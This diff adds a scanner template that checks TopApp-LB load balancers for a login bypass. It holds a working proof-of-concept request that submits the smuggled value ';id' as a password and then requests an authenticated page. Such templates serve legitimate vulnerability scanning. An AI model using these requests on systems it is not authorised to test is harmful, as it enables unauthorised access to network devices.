@@ -1,0 +1,36 @@
+id: poc-yaml-topapp-lb-any-user-login
+
+info:
+  name: poc-yaml-topapp-lb-any-user-login
+  author: Zve.Lin
+  severity: high
+  tags: xray-converted,ct-479138
+  reference:
+    - https://www.zilyun.com/9413.html
+
+http:
+  - raw:
+      - |
+        POST /login_check.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+        userName={{rand_base(8)}}&password=%3Bid&x=0&y=0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+  - raw:
+      - |
+        GET /acc/Header.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
